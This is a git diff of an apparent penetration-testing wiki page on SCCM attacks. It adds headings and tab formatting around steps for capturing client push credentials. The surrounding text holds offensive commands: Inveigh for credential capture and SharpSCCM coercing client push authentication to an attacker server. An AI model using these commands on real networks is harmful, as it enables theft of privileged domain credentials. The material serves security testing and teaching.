@@ -87,6 +87,8 @@ policysecretdecrypt.exe $HEX_STRING
 
 ### SCCMHunter
 
+#### HTTP
+
 Alternatively, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) automates all the attack with, or without, an already controlled computer accounts. For this purpose, the `http` module uses the result from the `find` command and enumerates the remote hosts for SCCM/MECM enrollment web services. If it finds one, it performs [Adam Chester](https://twitter.com/\_xpn\_)'s attack for the specified computer account. If no account is already under control, the `-auto` flag can be indicated to create a new computer account.
 
 ```bash
@@ -224,13 +226,17 @@ In some case, the "Client Push Accounts" could even be part of the Domain Admins
 
 The client push installation can be triggered forcefully or - if you're lucky - your compromised machine might not have the SCCM client installed, which mean you could capture the client push installation as it occurs.
 
+{% tabs %}
+{% tab title="Wait" %}
 **Option 1: Wait for Client Push Installation**
 
 ```powershell
 # Credential capture using Inveigh 
 Inveigh.exe
 ```
+{% endtab %}
 
+{% tab title="Coerce" %}
 **Option 2: Forcefully "coerce" the Client Push Installation**
 
 {% hint style="danger" %}
@@ -266,6 +272,8 @@ SharpSCCM.exe invoke client-push -t <AttackerServer>
 **Step 3: Cleanup**
 
 If you run the above SharpSCCM command with the `--as-admin` parameter (cause you have admin privileges over the MP), there's nothing to do. Otherwise get in contact with the administrator of the SCCM system you just messed up and provide the name or IP of the attacker server you provided in the `-t <AttackerServer>` parameter. This is the device name that will appear in SCCM.
+{% endtab %}
+{% endtabs %}
 
 ### SCCM Site Takeover
 
